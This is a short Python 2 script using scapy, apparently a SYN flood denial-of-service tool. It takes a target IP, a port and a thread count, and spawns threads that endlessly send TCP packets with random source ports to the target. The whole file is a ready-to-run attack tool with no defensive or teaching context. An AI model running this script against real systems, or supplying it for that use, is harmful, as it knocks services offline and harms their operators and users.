#!/usr/bin/python
#coding=utf-8

from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv)!=4:
    print "usage: ./sys_flood.py [IP] [Port] [thread count]"
    sys.exit()
target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

print "syn_flood to %s,ctrl+c to for exit..." %target
def synflood(target,port):
    while 1:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
for x in range(0,threads):
	thread.start_new_thread(synflood,(target,port))

while 1:
	sleep(1)
